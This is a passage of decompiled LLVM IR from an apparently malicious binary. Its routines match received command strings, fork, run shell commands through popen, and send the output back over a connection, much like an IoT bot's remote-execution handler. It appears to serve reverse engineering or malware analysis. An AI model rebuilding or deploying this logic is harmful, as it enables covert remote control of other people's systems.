dec_label_pc_1001150c:                            ; preds = %dec_label_pc_100114a8, %dec_label_pc_10011450
  store i32 %v5_10011498, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011514.900 to i32), i32* @lr, align 4
  %v1_10011510 = call i32 @pclose(i32 %v5_10011498)
  %v0_10011518 = call i32 @__GI_exit()
  store i32 %v0_10011518, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001151c

dec_label_pc_1001151c:                            ; preds = %dec_label_pc_1001141c, %dec_label_pc_1001150c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002dc2c.901 to i32), i32* @r4, align 4
  %v5_1001152c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([8 x i8]* @global_var_1002dc2c.901 to i32), i32 7)
  store i32 %v5_1001152c, i32* %r3.global-to-local, align 4
  %v3_10011534 = icmp eq i32 %v5_1001152c, 0
  br i1 %v3_10011534, label %dec_label_pc_1001153c, label %dec_label_pc_1001161c

dec_label_pc_1001153c:                            ; preds = %dec_label_pc_1001151c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011540 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011540, i32* %r3.global-to-local, align 4
  %v3_10011548 = icmp eq i32 %v1_10011540, 0
  br i1 %v3_10011548, label %dec_label_pc_10011550, label %dec_label_pc_10011c74

dec_label_pc_10011550:                            ; preds = %dec_label_pc_1001153c
  %v2_10011550 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011550, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506468, i32* @lr, align 4
  %v0_10011560 = call i32 @__GI_memset()
  store i32 %v2_10011550, i32* @r3, align 4
  store i32 268506504, i32* @lr, align 4
  %v1_10011584 = call i32 @sprintf(i32 %v2_10011550)
  store i32 %v2_10011550, i32* %r3.global-to-local, align 4
  store i32 268506524, i32* @lr, align 4
  %v5_10011598 = call i32 @popen(i32 %v2_10011550, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011598, i32* %r3.global-to-local, align 4
  store i32 268506624, i32* @lr, align 4
  %v1_100115fc62 = call i32 @feof(i32 %v5_10011598)
  store i32 %v1_100115fc62, i32* %r3.global-to-local, align 4
  %v3_1001160465 = icmp eq i32 %v1_100115fc62, 0
  br i1 %v3_1001160465, label %dec_label_pc_100115a8, label %dec_label_pc_1001160c

dec_label_pc_100115a8:                            ; preds = %dec_label_pc_10011550, %dec_label_pc_100115a8
  store i32 %v2_10011550, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506556, i32* @lr, align 4
  %v0_100115b8 = call i32 @__GI_memset()
  store i32 %v2_10011550, i32* %r3.global-to-local, align 4
  store i32 268506576, i32* @lr, align 4
  %v3_100115cc = call i32 @fgets(i32 %v2_10011550, i32 1024, i32 %v5_10011598)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100115ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011550)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506616, i32* @lr, align 4
  %v1_100115f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011598, i32* %r3.global-to-local, align 4
  store i32 268506624, i32* @lr, align 4
  %v1_100115fc = call i32 @feof(i32 %v5_10011598)
  store i32 %v1_100115fc, i32* %r3.global-to-local, align 4
  %v3_10011604 = icmp eq i32 %v1_100115fc, 0
  br i1 %v3_10011604, label %dec_label_pc_100115a8, label %dec_label_pc_1001160c

dec_label_pc_1001160c:                            ; preds = %dec_label_pc_100115a8, %dec_label_pc_10011550
  store i32 %v5_10011598, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011614.904 to i32), i32* @lr, align 4
  %v1_10011610 = call i32 @pclose(i32 %v5_10011598)
  %v0_10011618 = call i32 @__GI_exit()
  store i32 %v0_10011618, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001161c

dec_label_pc_1001161c:                            ; preds = %dec_label_pc_1001151c, %dec_label_pc_1001160c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002dd20.905 to i32), i32* @r4, align 4
  %v5_1001162c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([8 x i8]* @global_var_1002dd20.905 to i32), i32 6)
  store i32 %v5_1001162c, i32* %r3.global-to-local, align 4
  %v3_10011634 = icmp eq i32 %v5_1001162c, 0
  br i1 %v3_10011634, label %dec_label_pc_1001163c, label %dec_label_pc_1001171c

dec_label_pc_1001163c:                            ; preds = %dec_label_pc_1001161c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011640 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011640, i32* %r3.global-to-local, align 4
  %v3_10011648 = icmp eq i32 %v1_10011640, 0
  br i1 %v3_10011648, label %dec_label_pc_10011650, label %dec_label_pc_10011c74

dec_label_pc_10011650:                            ; preds = %dec_label_pc_1001163c
  %v2_10011650 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011650, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506724, i32* @lr, align 4
  %v0_10011660 = call i32 @__GI_memset()
  store i32 %v2_10011650, i32* @r3, align 4
  store i32 268506760, i32* @lr, align 4
  %v1_10011684 = call i32 @sprintf(i32 %v2_10011650)
  store i32 %v2_10011650, i32* %r3.global-to-local, align 4
  store i32 268506780, i32* @lr, align 4
  %v5_10011698 = call i32 @popen(i32 %v2_10011650, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011698, i32* %r3.global-to-local, align 4
  store i32 268506880, i32* @lr, align 4
  %v1_100116fc58 = call i32 @feof(i32 %v5_10011698)
  store i32 %v1_100116fc58, i32* %r3.global-to-local, align 4
  %v3_1001170461 = icmp eq i32 %v1_100116fc58, 0
  br i1 %v3_1001170461, label %dec_label_pc_100116a8, label %dec_label_pc_1001170c

dec_label_pc_100116a8:                            ; preds = %dec_label_pc_10011650, %dec_label_pc_100116a8
  store i32 %v2_10011650, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506812, i32* @lr, align 4
  %v0_100116b8 = call i32 @__GI_memset()
  store i32 %v2_10011650, i32* %r3.global-to-local, align 4
  store i32 268506832, i32* @lr, align 4
  %v3_100116cc = call i32 @fgets(i32 %v2_10011650, i32 1024, i32 %v5_10011698)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100116ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011650)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506872, i32* @lr, align 4
  %v1_100116f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011698, i32* %r3.global-to-local, align 4
  store i32 268506880, i32* @lr, align 4
  %v1_100116fc = call i32 @feof(i32 %v5_10011698)
  store i32 %v1_100116fc, i32* %r3.global-to-local, align 4
  %v3_10011704 = icmp eq i32 %v1_100116fc, 0
  br i1 %v3_10011704, label %dec_label_pc_100116a8, label %dec_label_pc_1001170c

dec_label_pc_1001170c:                            ; preds = %dec_label_pc_100116a8, %dec_label_pc_10011650
  store i32 %v5_10011698, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011714.908 to i32), i32* @lr, align 4
  %v1_10011710 = call i32 @pclose(i32 %v5_10011698)
  %v0_10011718 = call i32 @__GI_exit()
  store i32 %v0_10011718, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001171c

dec_label_pc_1001171c:                            ; preds = %dec_label_pc_1001161c, %dec_label_pc_1001170c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002dd9c.909 to i32), i32* @r4, align 4
  %v5_1001172c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([6 x i8]* @global_var_1002dd9c.909 to i32), i32 5)
  store i32 %v5_1001172c, i32* %r3.global-to-local, align 4
  %v3_10011734 = icmp eq i32 %v5_1001172c, 0
  br i1 %v3_10011734, label %dec_label_pc_1001173c, label %dec_label_pc_1001181c

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_1001171c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011740 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011740, i32* %r3.global-to-local, align 4
  %v3_10011748 = icmp eq i32 %v1_10011740, 0
  br i1 %v3_10011748, label %dec_label_pc_10011750, label %dec_label_pc_10011c74

dec_label_pc_10011750:                            ; preds = %dec_label_pc_1001173c
  %v2_10011750 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011750, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506980, i32* @lr, align 4
  %v0_10011760 = call i32 @__GI_memset()
  store i32 %v2_10011750, i32* @r3, align 4
  store i32 268507016, i32* @lr, align 4
  %v1_10011784 = call i32 @sprintf(i32 %v2_10011750)
  store i32 %v2_10011750, i32* %r3.global-to-local, align 4
  store i32 268507036, i32* @lr, align 4
  %v5_10011798 = call i32 @popen(i32 %v2_10011750, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011798, i32* %r3.global-to-local, align 4
  store i32 268507136, i32* @lr, align 4
  %v1_100117fc54 = call i32 @feof(i32 %v5_10011798)
  store i32 %v1_100117fc54, i32* %r3.global-to-local, align 4
  %v3_1001180457 = icmp eq i32 %v1_100117fc54, 0
  br i1 %v3_1001180457, label %dec_label_pc_100117a8, label %dec_label_pc_1001180c

dec_label_pc_100117a8:                            ; preds = %dec_label_pc_10011750, %dec_label_pc_100117a8
  store i32 %v2_10011750, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507068, i32* @lr, align 4
  %v0_100117b8 = call i32 @__GI_memset()
  store i32 %v2_10011750, i32* %r3.global-to-local, align 4
  store i32 268507088, i32* @lr, align 4
  %v3_100117cc = call i32 @fgets(i32 %v2_10011750, i32 1024, i32 %v5_10011798)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100117ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011750)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268507128, i32* @lr, align 4
  %v1_100117f4 = call i32 @sleep(i32 1)
  store i32 %v5_10011798, i32* %r3.global-to-local, align 4
  store i32 268507136, i32* @lr, align 4
  %v1_100117fc = call i32 @feof(i32 %v5_10011798)
  store i32 %v1_100117fc, i32* %r3.global-to-local, align 4
  %v3_10011804 = icmp eq i32 %v1_100117fc, 0
  br i1 %v3_10011804, label %dec_label_pc_100117a8, label %dec_label_pc_1001180c

dec_label_pc_1001180c:                            ; preds = %dec_label_pc_100117a8, %dec_label_pc_10011750
  store i32 %v5_10011798, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011814.912 to i32), i32* @lr, align 4
  %v1_10011810 = call i32 @pclose(i32 %v5_10011798)
  %v0_10011818 = call i32 @__GI_exit()
  store i32 %v0_10011818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001181c

dec_label_pc_1001181c:                            ; preds = %dec_label_pc_1001171c, %dec_label_pc_1001180c
  store i32 %v1_10010ea4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002df3c.913 to i32), i32* @r4, align 4
  %v5_1001182c = call i32 @__GI_strncmp(i8* %v5_10010ea8, i32 ptrtoint ([6 x i8]* @global_var_1002df3c.913 to i32), i32 5)
  store i32 %v5_1001182c, i32* %r3.global-to-local, align 4
  %v3_10011834 = icmp eq i32 %v5_1001182c, 0
  br i1 %v3_10011834, label %dec_label_pc_1001183c, label %dec_label_pc_1001191c

dec_label_pc_1001183c:                            ; preds = %dec_label_pc_1001181c
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_10011840 = call i32 @mfork(i32 %arg2)
  store i32 %v1_10011840, i32* %r3.global-to-local, align 4
  %v3_10011848 = icmp eq i32 %v1_10011840, 0
  br i1 %v3_10011848, label %dec_label_pc_10011850, label %dec_label_pc_10011c74

dec_label_pc_10011850:                            ; preds = %dec_label_pc_1001183c
  %v2_10011850 = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_10011850, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507236, i32* @lr, align 4
  %v0_10011860 = call i32 @__GI_memset()
  store i32 %v2_10011850, i32* @r3, align 4
  store i32 268507272, i32* @lr, align 4
  %v1_10011884 = call i32 @sprintf(i32 %v2_10011850)
  store i32 %v2_10011850, i32* %r3.global-to-local, align 4
  store i32 268507292, i32* @lr, align 4
  %v5_10011898 = call i32 @popen(i32 %v2_10011850, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6f0.111, i32 0, i32 0), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011898, i32* %stack_var_-2200, align 4
  store i32 %v5_10011898, i32* %r3.global-to-local, align 4
  store i32 268507392, i32* @lr, align 4
  %v1_100118fc50 = call i32 @feof(i32 %v5_10011898)
  store i32 %v1_100118fc50, i32* %r3.global-to-local, align 4
  %v3_1001190453 = icmp eq i32 %v1_100118fc50, 0
  br i1 %v3_1001190453, label %dec_label_pc_100118a8, label %dec_label_pc_1001190c

dec_label_pc_100118a8:                            ; preds = %dec_label_pc_10011850, %dec_label_pc_100118a8
  store i32 %v2_10011850, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507324, i32* @lr, align 4
  %v0_100118b8 = call i32 @__GI_memset()
  store i32 %v2_10011850, i32* %r3.global-to-local, align 4
  %v3_100118c8 = load i32, i32* %stack_var_-2200, align 4
  store i32 268507344, i32* @lr, align 4
  %v3_100118cc = call i32 @fgets(i32 %v2_10011850, i32 1024, i32 %v3_100118c8)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100118ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d4a4.878 to i32), i32 %arg2, i32 %v2_10011850)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268507384, i32* @lr, align 4
  %v1_100118f4 = call i32 @sleep(i32 1)
  %v3_100118f8 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100118f8, i32* %r3.global-to-local, align 4
  store i32 268507392, i32* @lr, align 4
  %v1_100118fc = call i32 @feof(i32 %v3_100118f8)
  store i32 %v1_100118fc, i32* %r3.global-to-local, align 4
  %v3_10011904 = icmp eq i32 %v1_100118fc, 0
  br i1 %v3_10011904, label %dec_label_pc_100118a8, label %dec_label_pc_1001190c

dec_label_pc_1001190c:                            ; preds = %dec_label_pc_100118a8, %dec_label_pc_10011850
  %v3_1001190c = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_1001190c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011914.916 to i32), i32* @lr, align 4
  %v1_10011910 = call i32 @pclose(i32 %v3_1001190c)
  %v0_10011918 = call i32 @__GI_exit()
  store i32 %v0_10011918, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001191c

dec_label_pc_1001191c:                            ; preds = %dec_label_pc_1001181c, %dec_label_pc_1001190c
  store i32 %v1_10010ea4, i32* @r3, align 4
  %v0_10011920 = call i32 @__GI_strlen()
  store i32 %v0_10011920, i32* %r3.global-to-local, align 4
  %v2_1001199c41 = icmp sgt i32 %v0_10011920, 0
  br i1 %v2_1001199c41, label %dec_label_pc_10011938.lr.ph, label %dec_label_pc_100119e8.preheader

dec_label_pc_10011938.lr.ph:                      ; preds = %dec_label_pc_1001191c
  %v2_10011970 = ptrtoint i32* %stack_var_-2200 to i32
  %v2_10011974 = add i32 %v2_10011970, 108
  br label %dec_label_pc_10011938

dec_label_pc_10011938:                            ; preds = %dec_label_pc_10011938.lr.ph, %dec_label_pc_10011960
  %storemerge1145 = phi i32 [ 0, %dec_label_pc_10011938.lr.ph ], [ %v1_1001198c, %dec_label_pc_10011960 ]
  %stack_var_-2152.044 = phi i8* [ %v5_10010ea8, %dec_label_pc_10011938.lr.ph ], [ %v5_10011984, %dec_label_pc_10011960 ]
  %v4_10011938 = ptrtoint i8* %stack_var_-2152.044 to i32
  %v2_1001193c = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011944 = icmp eq i8 %v2_1001193c, 32
  br i1 %v3_10011944, label %dec_label_pc_100119e8.preheader, label %dec_label_pc_1001194c

dec_label_pc_1001194c:                            ; preds = %dec_label_pc_10011938
  %v2_10011950 = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011958 = icmp eq i8 %v2_10011950, 0
  br i1 %v3_10011958, label %dec_label_pc_100119e8.preheader, label %dec_label_pc_10011960

dec_label_pc_10011960:                            ; preds = %dec_label_pc_1001194c
  %v2_10011968 = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011978 = add i32 %v2_10011974, %storemerge1145
  %v4_10011978 = inttoptr i32 %v3_10011978 to i8*
  store i8 %v2_10011968, i8* %v4_10011978, align 1
  %v1_10011980 = add i32 %v4_10011938, 1
  %v5_10011984 = inttoptr i32 %v1_10011980 to i8*
  %v1_1001198c = add nuw nsw i32 %storemerge1145, 1
  %v2_1001199c = icmp slt i32 %v1_1001198c, %v0_10011920
  br i1 %v2_1001199c, label %dec_label_pc_10011938, label %dec_label_pc_100119e8.preheader

dec_label_pc_100119e8.preheader:                  ; preds = %dec_label_pc_10011960, %dec_label_pc_10011938, %dec_label_pc_1001194c, %dec_label_pc_1001191c
  %stack_var_-2152.0.lcssa = phi i8* [ %v5_10010ea8, %dec_label_pc_1001191c ], [ %v5_10011984, %dec_label_pc_10011960 ], [ %stack_var_-2152.044, %dec_label_pc_10011938 ], [ %stack_var_-2152.044, %dec_label_pc_1001194c ]
  store i32 0, i32* %r29.global-to-local, align 4
  %v4_100119ec = ptrtoint i8* %stack_var_-2152.0.lcssa to i32
  store i32 %v4_100119ec, i32* @r3, align 4
  %v0_100119f033 = call i32 @__GI_strlen()
  store i32 %v0_100119f033, i32* %r3.global-to-local, align 4
  %v0_100119f834 = load i32, i32* %r29.global-to-local, align 4
  %v2_100119f835 = icmp ult i32 %v0_100119f834, %v0_100119f033
  br i1 %v2_100119f835, label %dec_label_pc_100119b0, label %dec_label_pc_10011a00

dec_label_pc_100119b0:                            ; preds = %dec_label_pc_100119e8.preheader, %dec_label_pc_100119dc
  %storemerge1239 = phi i32 [ %v1_100119e0, %dec_label_pc_100119dc ], [ 0, %dec_label_pc_100119e8.preheader ]
  %stack_var_-2156.138 = phi i32 [ %stack_var_-2156.0, %dec_label_pc_100119dc ], [ 0, %dec_label_pc_100119e8.preheader ]
  %v2_100119bc = add i32 %storemerge1239, %v4_100119ec
  %v1_100119c0 = inttoptr i32 %v2_100119bc to i8*
  %v2_100119c0 = load i8, i8* %v1_100119c0, align 1
  %v3_100119c8 = icmp eq i8 %v2_100119c0, 32
  br i1 %v3_100119c8, label %dec_label_pc_100119d0, label %dec_label_pc_100119dc

dec_label_pc_100119d0:                            ; preds = %dec_label_pc_100119b0
  %v1_100119d4 = add i32 %stack_var_-2156.138, 1
  br label %dec_label_pc_100119dc

dec_label_pc_100119dc:                            ; preds = %dec_label_pc_100119b0, %dec_label_pc_100119d0
  %stack_var_-2156.0 = phi i32 [ %v1_100119d4, %dec_label_pc_100119d0 ], [ %stack_var_-2156.138, %dec_label_pc_100119b0 ]
  %v1_100119e0 = add i32 %storemerge1239, 1
  store i32 %v1_100119e0, i32* %r29.global-to-local, align 4
  store i32 %v4_100119ec, i32* @r3, align 4
  %v0_100119f0 = call i32 @__GI_strlen()
  store i32 %v0_100119f0, i32* %r3.global-to-local, align 4
  %v0_100119f8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100119f8 = icmp ult i32 %v0_100119f8, %v0_100119f0
  br i1 %v2_100119f8, label %dec_label_pc_100119b0, label %dec_label_pc_10011a00

dec_label_pc_10011a00:                            ; preds = %dec_label_pc_100119dc, %dec_label_pc_100119e8.preheader
  %stack_var_-2156.1.lcssa = phi i32 [ 0, %dec_label_pc_100119e8.preheader ], [ %stack_var_-2156.0, %dec_label_pc_100119dc ]
  %v1_10011a04 = add i32 %stack_var_-2156.1.lcssa, 1
  %tmp145 = icmp slt i32 %v1_10011a04, 11
  br i1 %tmp145, label %dec_label_pc_10011a20, label %dec_label_pc_10011a18

dec_label_pc_10011a18:                            ; preds = %dec_label_pc_10011a00
  br label %dec_label_pc_10011a20

dec_label_pc_10011a20:                            ; preds = %dec_label_pc_10011a00, %dec_label_pc_10011a18
  %stack_var_-2156.2 = phi i32 [ %v1_10011a04, %dec_label_pc_10011a00 ], [ 10, %dec_label_pc_10011a18 ]
  %v1_10011a2c = mul i32 %stack_var_-2156.2, 4
  %v2_10011a34 = ptrtoint i32* %stack_var_-2200 to i32
  %v2_10011a38 = add i32 %v2_10011a34, 64
  %v1_10011a3c = add i32 %v2_10011a38, %v1_10011a2c
  %v2_10011a48 = inttoptr i32 %v1_10011a3c to i32*
  store i32 ptrtoint (i32* @global_var_10029e1c.200 to i32), i32* %v2_10011a48, align 4
  %v2_10011b6c27 = load i8, i8* %stack_var_-2152.0.lcssa, align 1
  %v3_10011b7430 = icmp eq i8 %v2_10011b6c27, 0
  br i1 %v3_10011b7430, label %dec_label_pc_10011b7c, label %dec_label_pc_10011a58.lr.ph

dec_label_pc_10011a58.lr.ph:                      ; preds = %dec_label_pc_10011a20
  %v2_10011ae8 = add i32 %v2_10011a34, 60
  br label %dec_label_pc_10011a58

dec_label_pc_10011a58:                            ; preds = %dec_label_pc_10011a58.lr.ph, %dec_label_pc_10011ac4
  %v4_10011b6832 = phi i32 [ %v4_100119ec, %dec_label_pc_10011a58.lr.ph ], [ %v2_10011b60, %dec_label_pc_10011ac4 ]
  %stack_var_-2160.031 = phi i32 [ 1, %dec_label_pc_10011a58.lr.ph ], [ %v1_10011b4c, %dec_label_pc_10011ac4 ]
  %v1_10011a5c = add i32 %v4_10011b6832, 1
  %v2_10011a6c = icmp slt i32 %stack_var_-2160.031, %stack_var_-2156.2
  br i1 %v2_10011a6c, label %dec_label_pc_10011a8c.preheader, label %dec_label_pc_10011b7c

dec_label_pc_10011a8c.preheader:                  ; preds = %dec_label_pc_10011a58
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011a5c, i32* @r3, align 4
  %v0_10011a9419 = call i32 @__GI_strlen()
  store i32 %v0_10011a9419, i32* %r3.global-to-local, align 4
  %v0_10011a9c20 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011a9c21 = icmp ult i32 %v0_10011a9c20, %v0_10011a9419
  br i1 %v2_10011a9c21, label %dec_label_pc_10011aa4, label %dec_label_pc_10011ac4

dec_label_pc_10011a80:                            ; preds = %dec_label_pc_10011aa4
  %v1_10011a84 = add i32 %storemerge1424, 1
  store i32 %v1_10011a84, i32* %r29.global-to-local, align 4
  store i32 %v1_10011a5c, i32* @r3, align 4
  %v0_10011a94 = call i32 @__GI_strlen()
  store i32 %v0_10011a94, i32* %r3.global-to-local, align 4
  %v0_10011a9c = load i32, i32* %r29.global-to-local, align 4
  %v2_10011a9c = icmp ult i32 %v0_10011a9c, %v0_10011a94
  br i1 %v2_10011a9c, label %dec_label_pc_10011aa4, label %dec_label_pc_10011ac4

dec_label_pc_10011aa4:                            ; preds = %dec_label_pc_10011a8c.preheader, %dec_label_pc_10011a80
  %storemerge1424 = phi i32 [ %v1_10011a84, %dec_label_pc_10011a80 ], [ 0, %dec_label_pc_10011a8c.preheader ]
  %v2_10011ab0 = add i32 %storemerge1424, %v1_10011a5c
  %v1_10011ab4 = inttoptr i32 %v2_10011ab0 to i8*
  %v2_10011ab4 = load i8, i8* %v1_10011ab4, align 1
  %v3_10011abc = icmp eq i8 %v2_10011ab4, 32
  br i1 %v3_10011abc, label %dec_label_pc_10011ac4, label %dec_label_pc_10011a80

dec_label_pc_10011ac4:                            ; preds = %dec_label_pc_10011a80, %dec_label_pc_10011aa4, %dec_label_pc_10011a8c.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_10011a8c.preheader ], [ %v1_10011a84, %dec_label_pc_10011a80 ], [ %storemerge1424, %dec_label_pc_10011aa4 ]
  store i32 %stack_var_-2160.031, i32* @r29, align 4
  %v1_10011acc = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10011acc, i32* @r3, align 4
  store i32 268507864, i32* @lr, align 4
  %v0_10011ad4 = call i32 @malloc()
  store i32 %v0_10011ad4, i32* %r3.global-to-local, align 4
  %v0_10011ae0 = load i32, i32* @r29, align 4
  %v1_10011ae0 = mul i32 %v0_10011ae0, 4
  %v1_10011aec = add i32 %v1_10011ae0, %v2_10011ae8
  %v2_10011af0 = inttoptr i32 %v1_10011aec to i32*
  store i32 %v0_10011ad4, i32* %v2_10011af0, align 4
  %v1_10011af8 = mul i32 %stack_var_-2160.031, 4
  %v1_10011b04 = add i32 %v1_10011af8, %v2_10011ae8
  %v1_10011b08 = inttoptr i32 %v1_10011b04 to i32*
  %v2_10011b08 = load i32, i32* %v1_10011b08, align 4
  store i32 %v2_10011b08, i32* %r3.global-to-local, align 4
  store i32 %v1_10011a5c, i32* @r4, align 4
  store i32 268507936, i32* @lr, align 4
  %v3_10011b1c = call i32 @strncpy(i32 %v2_10011b08, i32 %v1_10011a5c, i32 %storemerge14.lcssa)
  store i32 %v3_10011b1c, i32* %r3.global-to-local, align 4
  %v2_10011b34 = load i32, i32* %v1_10011b08, align 4
  %v2_10011b3c = add i32 %v2_10011b34, %storemerge14.lcssa
  %v3_10011b44 = inttoptr i32 %v2_10011b3c to i8*
  store i8 0, i8* %v3_10011b44, align 1
  %v1_10011b4c = add nuw i32 %stack_var_-2160.031, 1
  %v2_10011b60 = add i32 %storemerge14.lcssa, %v1_10011a5c
  %v5_10011b64 = inttoptr i32 %v2_10011b60 to i8*
  %v2_10011b6c = load i8, i8* %v5_10011b64, align 1
  %v3_10011b74 = icmp eq i8 %v2_10011b6c, 0
  br i1 %v3_10011b74, label %dec_label_pc_10011b7c, label %dec_label_pc_10011a58

dec_label_pc_10011b7c:                            ; preds = %dec_label_pc_10011ac4, %dec_label_pc_10011a58, %dec_label_pc_10011a20
  %v2_10011c68 = load i32, i32* bitcast ([4 x i8]** @global_var_1004075c.918 to i32*), align 4
  %v3_10011c6c = icmp eq i32 %v2_10011c68, 0
  br i1 %v3_10011c6c, label %dec_label_pc_10011c74, label %dec_label_pc_10011b88

dec_label_pc_10011b88:                            ; preds = %dec_label_pc_10011b7c
  store i32 %v2_10011c68, i32* @r3, align 4
  store i32 %v2_10010de4, i32* @r4, align 4
  %v2_10011bac = call i32 @__GI_strcasecmp(i32 %v2_10011c68, i32 %v2_10010de4)
  store i32 %v2_10011bac, i32* %r3.global-to-local, align 4
  %v2_10011bd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_1004075c.918 to i32), i32 4) to i32*), align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10011bd4)
  %v2_10011c3c15 = icmp sgt i32 %stack_var_-2156.2, 1
  br i1 %v2_10011c3c15, label %dec_label_pc_10011c08.lr.ph, label %dec_label_pc_10011c74

dec_label_pc_10011c08.lr.ph:                      ; preds = %dec_label_pc_10011b88
  %v2_10011c14 = add i32 %v2_10011a34, 60
  br label %dec_label_pc_10011c08

dec_label_pc_10011c08:                            ; preds = %dec_label_pc_10011c08.lr.ph, %dec_label_pc_10011c08
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_10011c08.lr.ph ], [ %v1_10011c2c, %dec_label_pc_10011c08 ]
  %v1_10011c0c = mul i32 %storemerge1318, 4
  %v1_10011c18 = add i32 %v2_10011c14, %v1_10011c0c
  %v1_10011c1c = inttoptr i32 %v1_10011c18 to i32*
  %v2_10011c1c = load i32, i32* %v1_10011c1c, align 4
  store i32 %v2_10011c1c, i32* @r3, align 4
  store i32 268508200, i32* @lr, align 4
  %v0_10011c24 = call i32 @free()
  store i32 %v0_10011c24, i32* %r3.global-to-local, align 4
  %v1_10011c2c = add nuw nsw i32 %storemerge1318, 1
  %v2_10011c3c = icmp slt i32 %v1_10011c2c, %stack_var_-2156.2
  br i1 %v2_10011c3c, label %dec_label_pc_10011c08, label %dec_label_pc_10011c74

